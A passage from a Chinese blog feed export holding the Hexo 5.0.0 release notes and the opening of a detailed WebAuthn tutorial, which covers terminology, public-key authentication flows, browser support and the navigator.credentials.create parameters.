4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a 